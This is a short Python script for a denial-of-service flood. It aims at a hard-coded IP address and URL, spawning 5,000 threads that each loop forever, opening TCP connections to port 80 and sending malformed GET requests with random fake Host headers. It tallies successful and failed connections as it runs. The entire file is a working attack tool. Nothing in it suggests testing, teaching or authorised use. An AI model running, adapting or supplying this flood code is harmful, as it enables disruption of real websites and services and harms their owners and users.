import random
import socket
from faker import Faker
import threading
import sys
fake = Faker()

ip='107.150.4.187'
target = 'https://ususbvi.top/'
attack_num=0
fail_num=0
port = 80

def get_fake_ip():
    return f'{random.randrange(0,255)}.{random.randrange(0,255)}.{random.randrange(0,255)}.{random.randrange(0,255)}'

def attack():

    while True:
        message = ''
        message += 'GET /' + ip + ' HTTP/1.1\r\n'
        message += 'Host: ' + get_fake_ip() + '\r\n\r\n'
        message += f'{fake.ios_platform_token()}\r\n'
        message += '\r\n'
    
        global attack_num, fail_num
        attack_num += 1

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.sendto((message).encode('ascii'), (ip, port))

            if (attack_num %1000==0): 
                sys.stderr.write(f'\r {attack_num-fail_num}/{attack_num} # success.')
                sys.stdout.flush()
            s.close()
        except Exception as e:
            fail_num+=1
            sys.stderr.write(f'\r {attack_num-fail_num}/{attack_num} # failed {e}')
            sys.stdout.flush()

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()